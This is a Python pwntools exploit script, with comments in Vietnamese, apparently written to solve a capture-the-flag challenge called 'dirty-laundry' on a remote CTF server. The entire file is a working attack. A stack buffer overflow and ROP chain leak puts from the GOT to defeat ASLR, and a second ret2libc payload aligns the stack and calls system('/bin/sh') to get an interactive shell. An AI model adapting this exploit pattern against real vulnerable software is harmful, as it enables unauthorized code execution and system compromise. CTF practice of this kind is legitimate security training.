from pwn import *

# Cấu hình
exe_path = './chal'
libc_path = './libc.so.6'

elf = ELF(exe_path)
libc = ELF(libc_path)
context.binary = elf
# context.log_level = 'debug'

# --- KẾT NỐI ---
p = remote('dirty-laundry.ctf.prgy.in', 1337, ssl=True)
# p = process(exe_path)

# Offset đệm
offset = 72

# --- STAGE 1: LEAK LIBC ---
log.info("--- Stage 1: Leaking ---")

# Gadget trong binary (No PIE nên địa chỉ cố định)
POP_RDI_R14_RET = 0x4011a7 
RET = 0x4011aa # Gadget 'ret' (dùng để align stack)

payload1 = flat(
    b'A' * offset,
    POP_RDI_R14_RET, 
    elf.got['puts'],    # RDI: puts GOT
    0xdeadbeef,         # R14: Rác
    elf.plt['puts'],    # Call puts
    
    RET,                # [ALIGN 1] Căn chỉnh stack trước khi vào vuln
    elf.symbols['vuln'] # Return về vuln
)

p.sendafter(b'Add your laundry: ', payload1)

# Nhận Leak
p.recvuntil(b'Laundry complete') 
try:
    leak_raw = p.recvline().strip()
    leaked_puts = u64(leak_raw.ljust(8, b'\x00'))
    log.success(f"Leaked puts: {hex(leaked_puts)}")
    
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f"Libc Base: {hex(libc.address)}")
except Exception as e:
    log.error(f"Leak failed: {e}")
    exit()

# --- STAGE 2: GET SHELL (SYSTEM) ---
log.info("--- Stage 2: Ret2Libc System ---")

# 1. Fake RBP: Trỏ vào vùng .bss (writable) để tránh SIGBUS
fake_rbp = elf.bss() + 0x100

# 2. Tìm gadget trong Libc
rop = ROP(libc)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
BIN_SH = next(libc.search(b'/bin/sh'))
SYSTEM = libc.symbols['system']

# 3. Payload System
# Tính toán Alignment:
# - Vuln return -> RSP đuôi 0 (Misaligned)
# - Gặp RET -> RSP đuôi 8
# - Gặp POP RDI -> RSP đuôi 8 (pop val) + 8 (pop addr) -> 8
# - Vào System -> RSP đuôi 8 (Chuẩn Alignment cho movaps)
payload2 = flat(
    b'A' * 64,       # Buffer
    fake_rbp,        # Fake RBP (Tránh lỗi SIGBUS)
    RET,             # [ALIGN 2] Thêm 1 RET để align cho System
    POP_RDI,
    BIN_SH,
    SYSTEM
)

p.sendafter(b'Add your laundry: ', payload2)

# Nhận shell
p.interactive()